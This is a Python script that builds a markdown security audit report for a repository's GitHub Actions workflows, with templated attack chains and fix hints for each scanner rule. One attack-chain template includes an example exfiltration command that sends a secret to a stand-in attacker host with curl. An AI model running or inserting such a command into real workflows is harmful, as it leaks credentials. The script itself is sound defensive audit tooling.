#!/usr/bin/env python3
"""Assemble the final workflow-security-audit report from findings_final.json."""
import json, os, re
from collections import Counter

TODAY = os.environ.get('TODAY', '2026-09-27')
REPO_NAME = os.environ.get('REPO_NAME', 'swarm-ai-research/aeon')
REPO_URL = os.environ.get('REPO_URL', 'https://github.com/swarm-ai-research/aeon')

findings = json.load(open('.audit/findings_final.json'))

# No prior audit exists → every finding is NEW.
for f in findings:
    f['delta'] = 'NEW'
    f['status'] = 'Manual required'

wf_count = len([x for x in os.listdir('.github/workflows') if x.endswith(('.yml','.yaml'))])
act_count = 0
if os.path.isdir('.github/actions'):
    for root, dirs, files in os.walk('.github/actions'):
        for x in files:
            if x in ('action.yml', 'action.yaml'):
                act_count += 1

sev_count = Counter(f['severity'] for f in findings)
total = len(findings)
crit = sev_count.get('Critical', 0)
high = sev_count.get('High', 0)
med = sev_count.get('Medium', 0)
low = sev_count.get('Low', 0)

new_count = sum(1 for f in findings if f['delta'] == 'NEW')
reintro = 0
unchanged = 0
resolved = 0
fixed = 0
manual = sum(1 for f in findings if f['severity'] in ('Critical', 'High'))

exit_mode = 'NEW_CRITICAL' if crit else ('NEW_HIGH' if high else 'NEW_INFO')
verdict = (
    f'WORKFLOW_AUDIT_NEW_CRITICAL — {crit} new critical, {high} new high, '
    f'{med} new medium, {low} new low; first on-disk delta baseline'
)

# Attack chains per rule
def snippet_at(file, line):
    try:
        lines = open(file).read().split('\n')
        if 0 < line <= len(lines):
            return lines[line-1].rstrip()
    except Exception:
        pass
    return ''

def workflow_triggers(file):
    """Return the on: triggers set for the workflow, as a set of trigger names."""
    try:
        text = open(file).read()
    except Exception:
        return set()
    tset = set()
    for trig in (
        'workflow_dispatch', 'repository_dispatch', 'issues', 'issue_comment',
        'pull_request_target', 'pull_request', 'schedule', 'push', 'workflow_call',
        'workflow_run',
    ):
        if re.search(rf'^\s*{trig}:', text, re.MULTILINE):
            tset.add(trig)
    return tset

def attack_chain(f):
    file = f['file']
    line = f['line']
    rule = f['rule_id']
    triggers = workflow_triggers(file)
    reachable_note = 'external triggerable' if triggers & {
        'workflow_dispatch', 'repository_dispatch', 'issues', 'issue_comment',
        'pull_request_target',
    } else 'internal triggers only (schedule/push/workflow_call)'

    if rule == 'zizmor/unpinned-uses':
        return {
            'entry': f'{sorted(triggers)} triggers on `{file}` ({reachable_note})',
            'vector': (
                f'{snippet_at(file, line).strip()} — floating tag ref '
                f'(`@v4.4.0`, `@v5`). If the tag is repointed by the action owner '
                f'(compromised account, malicious release, or force-moved tag), '
                f'the next run of this workflow silently pulls attacker code.'
            ),
            'sink': (
                'GitHub Actions runner clones the action at whatever commit the tag '
                'points to, then executes its `entrypoint`/`runs` with the job token.'
            ),
            'secrets': (
                'GITHUB_TOKEN at job scope; downstream steps in the same job also '
                'expose ANTHROPIC_API_KEY, GH_GLOBAL, TELEGRAM_BOT_TOKEN, DISCORD_*, '
                'SLACK_*, SENDGRID_API_KEY (whichever are referenced later in the file).'
            ),
            'blast': (
                'Full repository write (contents/actions write), workflow-dispatch on '
                'every other workflow, ability to rewrite `.github/workflows/*.yml`, '
                'exfiltrate every reachable secret across the fleet.'
            ),
        }
    if rule == 'zizmor/ref-version-mismatch':
        return {
            'entry': f'{sorted(triggers)} triggers on `{file}` ({reachable_note})',
            'vector': (
                f'{snippet_at(file, line).strip()} — SHA is pinned, but the `# vN` '
                f'comment does not match the tag pointing at that commit. A reviewer '
                f'trusting the comment may miss that the intended version drifted, or '
                f'a future edit trusts the comment and swaps the SHA back to a bad one.'
            ),
            'sink': 'Runner executes the pinned commit — no immediate RCE risk from '
                    'the mismatch itself; it is an audit-hygiene / trust-boundary bug.',
            'secrets': 'Same as any other step in the job (see file).',
            'blast': (
                'Low direct exploit; real risk is that the mismatch masks a rollback '
                'to an older or malicious commit in a future refactor that trusts the '
                'now-inaccurate comment.'
            ),
        }
    if rule == 'zizmor/secrets-outside-env':
        return {
            'entry': f'{sorted(triggers)} triggers on `{file}` ({reachable_note})',
            'vector': (
                f'{snippet_at(file, line).strip()} — secret referenced at job/step '
                f'scope, no GitHub Environment gating. Any collaborator who can land '
                f'a workflow-file edit (merged PR, direct push if allowed, or a '
                f'poisoned reusable-workflow call) can exfil by adding `curl '
                f'attacker.com -d "$SECRET"` in the same step.'
            ),
            'sink': (
                'Secret is expanded into an `env:` value or `with:` input, in-process, '
                'and shell can read it via `$SECRET_NAME`.'
            ),
            'secrets': f'{snippet_at(file, line).strip()[:200]}',
            'blast': (
                'Full compromise of the named secret. Fleet-wide credentials '
                '(ANTHROPIC_API_KEY, TELEGRAM_BOT_TOKEN, GH_GLOBAL) let attackers '
                'post from the bot identities and burn paid quotas until rotated.'
            ),
        }
    if rule == 'zizmor/template-injection':
        return {
            'entry': f'{sorted(triggers)} triggers on `{file}` ({reachable_note})',
            'vector': (
                f'{snippet_at(file, line).strip()} — `${{{{ … }}}}` interpolation '
                'renders into a `run:` block before the shell sees it. If the '
                'interpolated value is attacker-controlled (issue title, PR body, '
                'dispatch payload), embedded shell metacharacters execute.'
            ),
            'sink': 'Bash executes the rendered command line verbatim.',
            'secrets': 'Every secret exposed as env in the same step.',
            'blast': 'RCE on the runner with the reachable secret scope.',
        }
    if rule == 'zizmor/artipacked':
        return {
            'entry': f'{sorted(triggers)} triggers on `{file}` ({reachable_note})',
            'vector': (
                f'{snippet_at(file, line).strip()} — `actions/checkout` defaults '
                'to `persist-credentials: true`, which writes an `.git/config` '
                'extraheader containing the job token. If any later step uploads '
                'the workspace (artifact, cache, docker image, npm publish tarball), '
                'the token leaks to whoever downloads it.'
            ),
            'sink': 'Uploaded artifact / cache / image contents.',
            'secrets': 'GITHUB_TOKEN (persisted in `.git/config` extraheader)',
            'blast': (
                'Anyone able to fetch the artifact gets a short-lived job token — '
                'usable for repo writes for the artifact lifetime.'
            ),
        }
    return None


def render_finding(f):
    tag = f'[{f["severity"].upper()}]'
    delta_tag = f['delta']
    short = (f.get('msg') or '').split('\n')[0][:120]
    header = f'### {tag} `{f["rule_id"]}` — {short}'
    out = [header]
    out.append(f'**File:** `{f["file"]}` · **Line:** {f["line"]}'
               + (f' · **Step:** `{f["step_name"]}`' if f.get('step_name') else '')
               + f' · **Delta:** {delta_tag}')
    if f.get('snippet'):
        snip = f['snippet']
        # Compact snippet to first 6 lines to keep report readable
        snip_lines = snip.split('\n')[:6]
        out.append('**Pattern:**')
        out.append('```yaml')
        out.extend(snip_lines)
        out.append('```')
    ac = attack_chain(f)
    if ac:
        out.append('**Attack chain:**')
        out.append(f'1. **Entry:** {ac["entry"]}')
        out.append(f'2. **Vector:** {ac["vector"]}')
        out.append(f'3. **Sink:** {ac["sink"]}')
        out.append(f'4. **Reachable secrets:** {ac["secrets"]}')
        out.append(f'5. **Blast radius:** {ac["blast"]}')

    # Fix hints (all Manual for the rules we see)
    if f['rule_id'] == 'zizmor/unpinned-uses':
        out.append(
            '**Fix (manual):** replace the floating tag with the full commit SHA of '
            'the intended release, with the version as a trailing comment. Example:\n'
            '```yaml\n'
            '# BEFORE\n'
            'uses: actions/checkout@v4.4.0\n'
            '# AFTER\n'
            'uses: actions/checkout@85e6279cec87321a52edac9c87bce653a07cf6c2 # v4.4.0\n'
            '```\n'
            'Look up the SHA with `gh api repos/actions/checkout/git/refs/tags/v4.4.0 '
            "-q '.object.sha'` then verify it points at a signed tag."
        )
    elif f['rule_id'] == 'zizmor/ref-version-mismatch':
        out.append(
            '**Fix (manual):** run `gh api repos/OWNER/REPO/commits/SHA -q .commit.message` '
            'against the pinned SHA and update the trailing `# vN.N.N` comment to match '
            'the release tag at that commit (or repin to the SHA of the version you '
            'actually intend).'
        )
    elif f['rule_id'] == 'zizmor/secrets-outside-env':
        out.append(
            '**Fix (manual):** create a GitHub Environment '
            '(`production`, `chain-runner`, or per-secret), move the referenced '
            'secret into that Environment, then add `environment: <name>` to the '
            'job so the secret is only injected when the environment gate approves. '
            'Requires operator action in repo → Settings → Environments; no '
            'code-only fix.'
        )
    elif f['rule_id'] == 'zizmor/template-injection':
        out.append(
            '**Fix (manual, Low severity):** wrap the interpolation in an `env:` '
            'value on the step and reference the env var from the shell instead of '
            'interpolating directly, e.g.\n'
            '```yaml\n'
            'env:\n'
            '  _VALUE: ${{ github.event.some_field }}\n'
            'run: |\n'
            '  echo "$_VALUE"\n'
            '```'
        )
    elif f['rule_id'] == 'zizmor/artipacked':
        out.append(
            '**Fix (manual):** on the `actions/checkout` step add '
            '`with: { persist-credentials: false }` — unless a later step in the '
            'same job needs to `git push` back to the repo, in which case audit '
            'artifact/cache/image uploads for token leak.'
        )
    out.append(f'**Status:** {f["status"]}')
    out.append('')
    return '\n'.join(out)


lines = []
lines.append(f'# Workflow Security Audit — {TODAY}')
lines.append('')
lines.append(f'**Verdict:** {verdict}')
lines.append(f'**Repo:** [{REPO_NAME}]({REPO_URL})')
lines.append(f'**Files audited:** {wf_count + act_count} ({wf_count} workflows, {act_count} composite actions)')
lines.append(f'**Findings this run:** {total} ({crit} critical, {high} high, {med} medium, {low} low)')
lines.append(f'**Delta vs (no prior audit):** {new_count} new, {reintro} reintroduced, {unchanged} unchanged, {resolved} resolved')
lines.append(f'**Auto-fixed:** {fixed}')
lines.append('')
lines.append(
    '_This is the first machine-readable delta baseline landing on disk. Every '
    'finding is NEW because no prior `articles/workflow-security-audit-*.md` '
    'existed to diff against. Auto-fix count is 0 because all NEW Critical/High '
    'findings fall into the always-Manual categories per SKILL.md constraints '
    '(unpinned-uses, secrets-outside-env, ref-version-mismatch)._'
)
lines.append('')

# Regressions
lines.append('## Regressions (previously-fixed findings now present again)')
lines.append('')
lines.append('_None — no prior report to diff against._')
lines.append('')

# NEW Critical
lines.append('## New Critical findings')
lines.append('')
crit_findings = [f for f in findings if f['severity'] == 'Critical']
if not crit_findings:
    lines.append('_None._')
    lines.append('')
for f in crit_findings:
    lines.append(render_finding(f))
    lines.append('---')
    lines.append('')

# NEW High — group by rule, full narrative for first 2 per rule then compact table
lines.append('## New High findings')
lines.append('')
high_findings = [f for f in findings if f['severity'] == 'High']
by_rule = {}
for f in high_findings:
    by_rule.setdefault(f['rule_id'], []).append(f)
for rule, items in by_rule.items():
    lines.append(f'### {rule} — {len(items)} finding(s)')
    lines.append('')
    for f in items[:2]:
        lines.append(render_finding(f))
    if len(items) > 2:
        lines.append(f'**Additional {len(items)-2} finding(s) of `{rule}` (compact):**')
        lines.append('')
        lines.append('| File | Line | Step | Snippet |')
        lines.append('|------|-----:|------|---------|')
        for f in items[2:]:
            snip = ((f.get('snippet') or '').split('\n')[0] or f.get('msg', '')).replace('|', '\\|')[:100]
            step = (f.get('step_name') or '').replace('|', '\\|')[:40]
            lines.append(f'| `{f["file"]}` | {f["line"]} | {step} | `{snip}` |')
        lines.append('')
    lines.append('---')
    lines.append('')

# NEW Medium — compact
lines.append('## New Medium findings (compact)')
lines.append('')
med_findings = [f for f in findings if f['severity'] == 'Medium']
if med_findings:
    lines.append('| Rule | File | Line | Message |')
    lines.append('|------|------|-----:|---------|')
    for f in med_findings:
        msg = (f.get('msg') or '').split('\n')[0].replace('|', '\\|')[:120]
        lines.append(f'| `{f["rule_id"]}` | `{f["file"]}` | {f["line"]} | {msg} |')
else:
    lines.append('_None._')
lines.append('')

# NEW Low — compact
lines.append('## New Low findings (compact)')
lines.append('')
low_findings = [f for f in findings if f['severity'] == 'Low']
if low_findings:
    lines.append('| Rule | File | Line | Message |')
    lines.append('|------|------|-----:|---------|')
    for f in low_findings:
        msg = (f.get('msg') or '').split('\n')[0].replace('|', '\\|')[:120]
        lines.append(f'| `{f["rule_id"]}` | `{f["file"]}` | {f["line"]} | {msg} |')
else:
    lines.append('_None._')
lines.append('')

# Carried over
lines.append('## Carried over (unchanged)')
lines.append('')
lines.append('_None — no prior report._')
lines.append('')

# Resolved
lines.append('## Resolved since prior audit')
lines.append('')
lines.append(
    '_None — no prior report. Note for future delta baselines: the historical '
    '`toJson(github.event.client_payload.message)` shell-injection pattern '
    '(April 11 miss referenced in SKILL.md step 2) is verified fixed at '
    '`.github/workflows/messages.yml:667` — the payload is bound to '
    '`_CLIENT_PAYLOAD_MESSAGE` on the step\'s `env:` map, and the `run:` block '
    'reads `"$_CLIENT_PAYLOAD_MESSAGE"` via `printf`/`jq`, not `echo` into a '
    'command substitution._'
)
lines.append('')

# Source status
z_count = sum(1 for f in findings if f['source'] == 'zizmor')
a_count = sum(1 for f in findings if f['source'] == 'actionlint')
h_count = sum(1 for f in findings if f['source'] == 'hand-rolled')
lines.append('## Source status')
lines.append('')
lines.append(f'- zizmor: ok — {z_count} findings')
lines.append(f'- actionlint: ok — {a_count} findings')
lines.append(f'- hand-rolled: ok — {h_count} findings (all supplemental patterns confirmed absent)')
lines.append('')

# Fingerprint trailer
lines.append('<!--')
lines.append('workflow-security-audit-fingerprints')
for f in findings:
    step = (f.get('step_name') or f.get('step') or f'L{f["line"]}')
    step = re.sub(r'\s+', '_', step)
    status = 'auto-fixed' if f['status'].startswith('Auto') else 'manual'
    lines.append(
        f'{f["fingerprint"]} severity={f["severity"]} status={status} '
        f'rule={f["rule_id"]} file={f["file"]} step={step}'
    )
lines.append('-->')
lines.append('')

out_path = f'articles/workflow-security-audit-{TODAY}.md'
open(out_path, 'w').write('\n'.join(lines))
print(f'Wrote {out_path} ({len(lines)} lines, {sum(len(x) for x in lines)} bytes)')
print(f'Verdict: {verdict}')
print(f'Exit mode: {exit_mode}')
print(f'Findings: total={total} crit={crit} high={high} med={med} low={low}')
print(f'Auto-fixed: {fixed}, Manual: {manual}')

# Also emit a small JSON summary so the shell step can read it back
summary = {
    'today': TODAY,
    'verdict': verdict,
    'exit_mode': exit_mode,
    'total': total,
    'crit': crit,
    'high': high,
    'med': med,
    'low': low,
    'new': new_count,
    'reintroduced': reintro,
    'unchanged': unchanged,
    'resolved': resolved,
    'fixed': fixed,
    'manual': manual,
    'z_count': z_count,
    'a_count': a_count,
    'h_count': h_count,
    'wf_count': wf_count,
    'act_count': act_count,
    'report_path': out_path,
    'top_chains': [
        {'rule': f['rule_id'], 'file': f['file'], 'line': f['line']}
        for f in findings if f['severity'] == 'Critical'
    ][:3],
}
open('.audit/summary.json', 'w').write(json.dumps(summary, indent=2))
print('wrote .audit/summary.json')
